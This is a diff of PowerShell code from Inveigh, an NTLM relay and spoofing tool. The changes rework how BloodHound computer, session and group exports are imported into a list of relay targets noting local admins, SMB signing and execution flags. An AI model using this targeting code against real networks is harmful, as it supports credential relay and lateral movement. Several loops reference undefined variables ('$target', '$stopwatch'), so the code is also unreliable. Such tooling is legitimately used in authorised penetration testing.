+        $sessions_temp = $inveigh.session
         $i = 0
 
         while($i -lt $inveigh.session_socket_table.Count)
@@ -6768,18 +7137,20 @@ Get relay session list.
 
             if(!$inveigh.session_socket_table[$i].Connected)
             {
-                $inveigh.session_list[$i] | Where-Object {$_.Status = "disconnected"}
+                $inveigh.session[$i] | Where-Object {$_.Status = "disconnected"}
             }
         
             $i++
         }
 
-        Write-Output $inveigh.session_list | Format-Table -AutoSize
+        Write-Output $sessions_temp | Format-Table -AutoSize
     }
 
-    if($Enumeration)
+    if($Enumerate)
     {
-        Write-Output $inveigh.enumerated_data | Format-Table
+        $enumerate_temp = $inveigh.enumerate
+        Write-Output $enumerate_temp
+        Remove-Variable enumerate_temp
     }
 
 }
@@ -6798,7 +7169,7 @@ Watch-Inveigh will enabled real time console output. If using this function thro
 param
 ( 
     [parameter(Mandatory=$false)][Switch]$NoConsoleMessage,
-    [parameter(Mandatory=$false)][ValidateSet("Low","Medium")][String]$ConsoleOutput = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$ConsoleOutput = "Y",
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
 
@@ -6807,12 +7178,12 @@ if($inveigh.tool -ne 1)
 
     if($inveigh.running -or $inveigh.relay_running)
     {
-
+        
         if(!$NoConsoleMessage)
         {
             Write-Output "[*] Press any key to stop console output"
         }
-        
+
         $inveigh.console_output = $true
 
         :console_loop while((($inveigh.running -or $inveigh.relay_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
@@ -6915,24 +7286,52 @@ function ConvertTo-Inveigh
 {
     <#
     .SYNOPSIS
-    ConvertTo-Inveigh imports Bloodhound computers, groups and session JSON files into $inveigh.enumerated_data
+    ConvertTo-Inveigh imports Bloodhound computers, groups and session JSON files into $inveigh.enumerate
     for Inveigh Relay targeting.
+
+    .DESCRIPTION
+    For the fastest import, import the data before gather any enumeration data with Inveigh.
+
+    .PARAMETER BloodHoundComputersJSON
+    BloodHound computers file.
+
+    .PARAMETER BloodHoundSessionsJSON
+    BloodHound sessions file.
+
+    .PARAMETER BloodHoundGroupsJSON
+    BloodHound groups file.
+
+    .PARAMTER DNS
+    Enable DNS lookups
     #>
 
     [CmdletBinding()]
     param
     ( 
-        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$BloodHoundComputersJSON,
-        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$BloodHoundSessionsJSON,
-        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$BloodHoundGroupsJSON,
+        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Computers,
+        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Sessions,
+        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Groups,
         [parameter(Mandatory=$false)][Switch]$DNS,
         [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
     )
+
+    if(!$Computers -and !$Sessions -and !$Groups)
+    {
+        Write-Output "Specifiy a BloodHound computers, groups, or sessions JSON file"
+        throw
+    }
+
+    if($inveigh.running -or $inveigh.relay_running)
+    {
+        Write-Output "Run Stop-Inveigh before importing data with ConvertTo-Inveigh"
+        throw
+    }
 
     if(!$inveigh)
     {
         $global:inveigh = [HashTable]::Synchronized(@{})
         $inveigh.cleartext_list = New-Object System.Collections.ArrayList
+        $inveigh.enumerate = New-Object System.Collections.ArrayList
         $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
         $inveigh.log = New-Object System.Collections.ArrayList
         $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
@@ -6953,14 +7352,14 @@ function ConvertTo-Inveigh
         $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
         $inveigh.group_table = [HashTable]::Synchronized(@{})
         $inveigh.session_count = 0
-        $inveigh.session_list = @()
-        $inveigh.enumerated_data = @()
+        $inveigh.session = @()
     }
 
     function New-RelayEnumObject
     {
-        param ($IP,$Hostname,$Sessions,$AdministratorUsers,$AdministratorGroups,$Privileged,$Shares,$NetSessions,$NetSessionsMapped,
-        $LocalUsers,$SMB2,$Signing,$SMBServer,$Targeted,$Enumerate,$Execute)
+        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,
+            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,
+            $IPv6Only,$Targeted,$Enumerate,$Execute)
 
         if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
         if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}
@@ -6972,9 +7371,11 @@ function ConvertTo-Inveigh
         if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}
 
         $relay_object = New-Object PSObject
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerated_data.Count
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerate.Count
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IP" $IP
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Hostname" $Hostname
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Domain" $DNSDomain
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "netBIOS Domain" $netBIOSDomain
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Sessions" $Sessions
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Users" $AdministratorUsers
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Groups" $AdministratorGroups
@@ -6986,9 +7387,11 @@ function ConvertTo-Inveigh
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB2.1" $SMB2
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Signing" $Signing
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB Server" $SMBServer
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Record" $DNSRecord
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IPv6 Only" $IPv6Only
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Targeted" $Targeted
         Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Enumerate" $Enumerate
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execure
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execute
         
         return $relay_object
     }
@@ -7019,12 +7422,127 @@ function ConvertTo-Inveigh
         return $IP
     }
 
-    if($BloodHoundComputersJSON)
+    # JSON parsing from http://wahlnetwork.com/2016/03/15/deserializing-large-json-payloads-powershell-objects/ 
+    function Invoke-ParseItem($JSONItem) 
     {
-        $bloodHound_computers_JSON = Get-Content $BloodHoundComputersJSON
-        $bloodhound_computers = ConvertFrom-Json -InputObject $bloodhound_computers_JSON
+
+        if($JSONItem.PSObject.TypeNames -match 'Array') 
+        {
+            return Invoke-ParseJsonArray($JSONItem)
+        }
+        elseif($JSONItem.PSObject.TypeNames -match 'Dictionary') 
+        {
+            return Invoke-ParseJsonObject([HashTable]$JSONItem)
+        }
+        else 
+        {
+            return $JSONItem
+        }
+
+    }
+
+    function Invoke-ParseJsonObject($JSONObject) 
+    {
+        $result = New-Object -TypeName PSCustomObject
+
+        foreach($key in $JSONObject.Keys) 
+        {
+            $item = $JSONObject[$key]
+
+            if ($item) 
+            {
+                $parsed_item = Invoke-ParseItem $item
+            }
+            else 
+            {
+                $parsed_item = $null
+            }
+
+            $result | Add-Member -MemberType NoteProperty -Name $key -Value $parsed_item
+        }
+
+        return $result
+    }
+
+    function Invoke-ParseJSONArray($JSONArray) 
+    {
+        $result = @()
+        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
+        $i = 0
+
+        $JSONArray | ForEach-Object -Process {
+
+            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
+            {
+                $percent_complete_calculation = [Math]::Truncate($i / $JSONArray.count * 100)
+
+                if($percent_complete_calculation -le 100)
+                {
+                    Write-Progress -Activity "Parsing JSON" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
+                }
+
+                $stopwatch_progress.Reset()
+                $stopwatch_progress.Start()
+            }
+
+            $i++
+            $result += , (Invoke-ParseItem $_)}
+
+        return $result
+    }
+
+    function Invoke-ParseJSONString($json) 
+    {
+        $config = $javaScriptSerializer.DeserializeObject($json)
+
+        return Invoke-ParseJsonObject $config
+    }
+
+    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")
+
+    if($inveigh.enumerate.Count -eq 0)
+    {
+        $enumerate_empty = $true
+    }
+
+    if($Computers)
+    {       
+        $Computers = (Resolve-Path $Computers).Path
+        $computers_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
+        $computers_serializer.MaxJsonLength = 104857600
+        $bloodhound_computers = [System.IO.File]::ReadAllText($Computers)
+        $bloodhound_computers = $computers_serializer.DeserializeObject($bloodhound_computers)
+        Write-Output "[*] Parsing BloodHound Computers JSON"
+        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
+        $bloodhound_computers = Invoke-ParseItem $bloodhound_computers
+        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
+        $stopwatch_parse.Reset()
+        $stopwatch_parse.Start()
+        Write-Output "[*] Importing computers to Inveigh"
+        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
+        $i = 0
+
+        if(!$bloodhound_computers.Computers)
+        {
+            Write-Output "[!] JSON computers parse failed"
+            throw
+        }
 
         $bloodhound_computers.Computers | ForEach-Object {
+
+            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
+            {
+                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_computers.Computers.Count * 100)
+
+                if($percent_complete_calculation -le 100)
+                {
+                    Write-Progress -Activity "[*] Importing computers" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
+                }
+
+                $stopwatch_progress.Reset()
+                $stopwatch_progress.Start()
+            }
+
             $hostname = $_.Name
             [Array]$local_admin_users = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name
             [Array]$local_admin_groups = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name
@@ -7040,25 +7558,61 @@ function ConvertTo-Inveigh
 
             }
 
-            if(($hostname -and ($inveigh.enumerated_data | Where-Object {$_.Hostname -eq $hostname})) -or ($IP -and ($inveigh.enumerated_data | Where-Object {$_.IP -eq $IP})))
+            if(!$enumerate_empty)
             {
 
-                if(!($inveigh.enumerated_data | Where-Object {$_.Hostname -eq $hostname}) -and ($inveigh.enumerated_data | Where-Object {$_.IP -eq $IP}))
+                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                 {
-                    $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $IP} | Select-Object -expand Index -First 1
-                    $inveigh.enumerated_data[$target_index].Hostname = $hostname
-                }
-                else
-                {
-                    $target_index = $inveigh.enumerated_data | Where-Object {$_.Hostname -eq $hostname} | Select-Object -expand Index -First 1
+
+                    if(($hostname -and $inveigh.enumerate[$i].Hostname -eq $hostname) -or ($IP -and $inveigh.enumerate[$i].IP -eq $IP))
+                    {
+
+                        if($inveigh.enumerate[$i].Hostname -ne $hostname -and $inveigh.enumerate[$i].IP -eq $IP)
+                        {
+
+                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)
+                            {
+
+                                if($inveigh.enumerate[$j].IP -eq $target)
+                                {
+                                    $target_index = $j
+                                    break
+                                }
+
+                            }
+
+                            $inveigh.enumerate[$target_index].Hostname = $hostname
+                        }
+                        else
+                        {
+
+                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)
+                            {
+
+                                if($inveigh.enumerate[$j].Hostname -eq $hostname)
+                                {
+                                    $target_index = $j
+                                    break
+                                }
+
+                            }
+
+                        }
+
+                        $inveigh.enumerate[$target_index]."Administrator Users" = $local_admin_users
+                        $inveigh.enumerate[$target_index]."Administrator Groups" = $local_admin_groups
+                    }
+                    else
+                    {
+                        $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null
+                    }
+
                 }
 
-                $inveigh.enumerated_data[$target_index]."Administrator Users" = $local_admin_users
-                $inveigh.enumerated_data[$target_index]."Administrator Groups" = $local_admin_groups
             }
             else
             {
-                $inveigh.enumerated_data += New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups
+                $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null
             }
 
             $IP = $null
@@ -7066,25 +7620,83 @@ function ConvertTo-Inveigh
             $local_admin_users = $null
             $local_admin_groups = $null
             $target_index = $null
+            $i++
         }
 
+        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
+        $stopwatch_parse.Reset()
+        Remove-Variable bloodhound_computers
     }
 
-    if($BloodHoundSessionsJSON)
+    if($Sessions)
     {
-        $bloodhound_sessions_JSON = Get-Content $BloodHoundSessionsJSON
-        $bloodhound_sessions = ConvertFrom-Json -InputObject $bloodhound_sessions_JSON
+        $Sessions = (Resolve-Path $Sessions).Path
+        $sessions_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
+        $sessions_serializer.MaxJsonLength = 104857600
+        $bloodhound_sessions = [System.IO.File]::ReadAllText($Sessions)
+        $bloodhound_sessions = $sessions_serializer.DeserializeObject($bloodhound_sessions)
+        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
+        Write-Output "[*] Parsing BloodHound Sessions JSON"
+        $bloodhound_sessions = Invoke-ParseItem $bloodhound_sessions
+        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
+        $stopwatch_parse.Reset()
+        $stopwatch_parse.Start()
+        Write-Output "[*] Importing sessions to Inveigh"
+        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
+        $i = 0
+
+        if(!$bloodhound_sessions.Sessions)
+        {
+            Write-Output "[!] JSON sessions parse failed"
+            throw
+        }
 
         $bloodhound_sessions.Sessions | ForEach-Object {
+            
+            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
+            {
+                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_sessions.Sessions.Count * 100)
+
+                if($percent_complete_calculation -le 100)
+                {
+                    Write-Progress -Activity "[*] Importing sessions" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
+                }
+
+                $stopwatch_progress.Reset()
+                $stopwatch_progress.Start()
+            }
+
             $hostname = $_.ComputerName
 
-            if($hostname -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
+            if($hostname -as [IPAddress] -as [Bool])
             {
                 $IP = $hostname
                 $hostname = $null
+
+                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                {
+
+                    if($inveigh.enumerate[$i].IP -eq $target)
+                    {
+                        $target_index = $i
+                        break
+                    }
+
+                }
+
             }
             else
             {
+                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                {
+
+                    if($inveigh.enumerate[$i].Hostname -eq $hostname)
+                    {
+                        $target_index = $i
+                        break
+                    }
+
+                }
 
                 if($DNS)
                 {
@@ -7099,50 +7711,79 @@ function ConvertTo-Inveigh
 
             }
 
-            if(($hostname -and ($inveigh.enumerated_data | Where-Object {$_.Hostname -eq $hostname})) -or ($IP -and ($inveigh.enumerated_data | Where-Object {$_.IP -eq $IP})))
+            if(!$enumerate_empty -or $target_index -ge 0)
             {
+                [Array]$session_list = $inveigh.enumerate[$target_index].Sessions
 
-                if($IP)
-                {
-                    $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $IP} | Select-Object -expand Index -First 1
-                }
-                else
-                {
-                    $target_index = $inveigh.enumerated_data | Where-Object {$_.Hostname -eq $hostname} | Select-Object -expand Index -First 1
-                }
-
-                [Array]$session_list = $inveigh.enumerated_data[$target_index].Sessions
-                 
                 if($session_list -notcontains $_.UserName)
                 {
                     $session_list += $_.UserName
-                    $inveigh.enumerated_data[$target_index].Sessions = $session_list
+                    $inveigh.enumerate[$target_index].Sessions = $session_list
                 }
 
             }
             else
             {   
-                $inveigh.enumerated_data += New-RelayEnumObject -Hostname $hostname -IP $IP -Sessions $_.UserName
+                $inveigh.enumerate.Add($(New-RelayEnumObject -Hostname $hostname -IP $IP -Sessions $_.UserName)) > $null
             }
 
             $hostname = $null
             $IP = $null
             $session_list = $null
             $target_index = $null
+            $i++
         }
+
+        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
+        $stopwatch_parse.Reset()
+        Remove-Variable bloodhound_sessions
     }
     
-    if($BloodHoundGroupsJSON)
+    if($Groups)
     {
-        $bloodhound_groups_JSON = Get-Content $BloodHoundGroupsJSON
-        $bloodhound_groups = ConvertFrom-Json -InputObject $bloodhound_groups_JSON
+        $Groups = (Resolve-Path $Groups).Path
+        $groups_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
+        $groups_serializer.MaxJsonLength = 104857600
+        $bloodhound_groups = [System.IO.File]::ReadAllText($Groups)
+        $bloodhound_groups = $groups_serializer.DeserializeObject($bloodhound_groups)
+        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
+        Write-Output "[*] Parsing BloodHound Groups JSON"
+        $bloodhound_groups = Invoke-ParseItem $bloodhound_groups
+        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
+        $stopwatch_parse.Reset()
+        $stopwatch_parse.Start()
+        Write-Output "[*] Importing groups to Inveigh"
+        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
+        $i = 0
+
+        if(!$bloodhound_groups.Groups)
+        {
+            Write-Output "[!] JSON groups parse failed"
+            throw
+        }
         
         $bloodhound_groups.Groups | ForEach-Object {
+
+            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
+            {
+                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_groups.Groups.Count * 100)
+
+                if($percent_complete_calculation -le 100)
+                {
+                    Write-Progress -Activity "[*] Importing groups" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
+                }
+
+                $stopwatch_progress.Reset()
+                $stopwatch_progress.Start()
+            }
+
             [Array]$group_members = $_.Members | Select-Object -expand MemberName
             $inveigh.group_table.Add($_.Name,$group_members)
             $group_members = $null
+            $i++
         }
 
+        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds"
     }
 
 }
